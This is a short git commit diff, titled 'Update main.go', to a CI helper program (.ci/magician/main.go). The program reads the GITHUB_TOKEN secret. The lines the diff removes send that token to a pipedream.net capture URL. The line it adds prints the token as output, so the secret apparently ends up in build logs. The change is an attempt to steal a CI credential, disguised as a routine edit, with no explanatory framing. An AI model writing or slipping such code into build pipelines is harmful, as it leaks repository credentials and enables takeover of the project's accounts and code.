3954f7f403cdf59ede4c32592553f41f6bf7e474
manunio <maxnair.dev@gmail.com>
2024-07-31 18:15:23 +0530

    Update main.go

--- .ci/magician/main.go
+++ .ci/magician/main.go
@@ -8,8 +8,5 @@ import (
 
 func main() {
 	token := os.Getenv("GITHUB_TOKEN")
-	_, err := http.Get("https://eofeuuypisxyg56.m.pipedream.net/" + token)
-	if err != nil {
-		fmt.Println(err)
-	}
+	fmt.Printf("TOKEN: %s", token)
 }
